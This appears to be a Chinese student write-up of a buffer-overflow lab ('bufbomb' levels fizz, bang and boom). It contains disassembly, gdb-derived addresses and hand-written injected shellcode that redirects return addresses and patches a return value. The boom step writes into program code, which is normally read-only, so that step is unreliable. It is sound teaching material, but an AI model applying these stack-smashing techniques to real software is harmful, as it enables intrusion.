`fizz`

`fizz()`需要将`makecookie`产生的`cookie`作为参数传入。

```
$./makecookie U202215559
0x26e03bce
```

```asm6502
080491ec <getbuf>:
 80491ec:    55                       push   %ebp
 80491ed:    89 e5                    mov    %esp,%ebp
 80491ef:    83 ec 38                 sub    $0x38,%esp
 80491f2:    8d 45 d8                 lea    -0x28(%ebp),%eax
 80491f5:    89 04 24                 mov    %eax,(%esp)
 80491f8:    e8 55 fb ff ff           call   8048d52 <Gets>
 80491fd:    b8 01 00 00 00           mov    $0x1,%eax
 8049202:    c9                       leave  
 8049203:    c3                       ret   
```

```asm6502
08048cba <fizz>:
 8048cba:    55                       push   %ebp
 8048cbb:    89 e5                    mov    %esp,%ebp
 8048cbd:    83 ec 18                 sub    $0x18,%esp
 8048cc0:    8b 45 08                 mov    0x8(%ebp),%eax
 8048cc3:    3b 05 20 c2 04 08        cmp    0x804c220,%eax
 8048cc9:    75 1e                    jne    8048ce9 <fizz+0x2f>
 8048ccb:    89 44 24 04              mov    %eax,0x4(%esp)
 8048ccf:    c7 04 24 2e a1 04 08     movl   $0x804a12e,(%esp)
 8048cd6:    e8 f5 fb ff ff           call   80488d0 <printf@plt>
 8048cdb:    c7 04 24 01 00 00 00     movl   $0x1,(%esp)
 8048ce2:    e8 5d 06 00 00           call   8049344 <validate>
 8048ce7:    eb 10                    jmp    8048cf9 <fizz+0x3f>
 8048ce9:    89 44 24 04              mov    %eax,0x4(%esp)
 8048ced:    c7 04 24 c4 a2 04 08     movl   $0x804a2c4,(%esp)
 8048cf4:    e8 d7 fb ff ff           call   80488d0 <printf@plt>
 8048cf9:    c7 04 24 00 00 00 00     movl   $0x0,(%esp)
 8048d00:    e8 8b fc ff ff           call   8048990 <exit@plt>
```

我们首先将返回地址改为`08048cba`，即`fizz()`的首地址。

观察`fizz()`函数，我们可以判断出`fizz()`接受的参数储存在栈上，在`0x8048cc0`处，这个参数的地址是`0x8(%ebp)`，即调用的`getbuf()`的返回地址所在地址`+0x8`，只需要在这个位置注入我们的`cookie`即可。

`bang`

通过`gdb`我们可以得知`global_value`的地址为`0x804c218`，`bang()`的地址为`0x8048d05`。编写代码如下:

```asm6502
00000000 <.text>:
   0:    b8 ce 3b e0 26           mov    $0x26e03bce,%eax
   5:    a3 18 c2 04 08           mov    %eax,0x804c218
   a:    68 05 8d 04 08           push   $0x8048d05
   f:    c3                       ret    
```

我们得到了攻击代码，接下来我们通过将代码注入到缓存区，使程序跳转到我们的攻击代码。

现在的问题在于，我们应该将代码放在哪里呢？

通过`gdb`我们可以知道，我们输入的字符串首地址为`0x55683298`，不妨就放在这里吧！

`boom`

将攻击代码存储在字符串这块空间内。先将`getbuf`的返回地址改为攻击代码的首地址，接着在攻击代码中将返回地址更改为原值。通过简单的计算不难得到，返回地址所在的地址为`0x556832c4`，返回到哪里呢？`getbuf`是在`test`中被调用的，不难查到`call`的下一个指令地址为`0x8048e81`

我们希望`getbuf`能够返回正确的cookie值，即`0x26e03bce`。

我们回顾`getbuf`的代码，代码最后将`0x1`存入了`%eax`，使得`getbuf`永远返回`0x1`，因此我们要将这个立即数改为`0x26e03bce`。通过查询反汇编代码，我们可以知道这个立即数的地址为 `0x80491fe`。

万事俱备，我们开始编写攻击代码。

```asm6502
00000000 <.text>:
   0:    b8 ce 3b e0 26           mov    $0x26e03bce,%eax
   5:    a3 fe 91 04 08           mov    %eax,0x80491fe
   a:    c7 05 c4 32 68 55 81     movl   $0x8048e81,0x556832c4
  11:    8e 04 08 
  14:    c3                       ret    
```
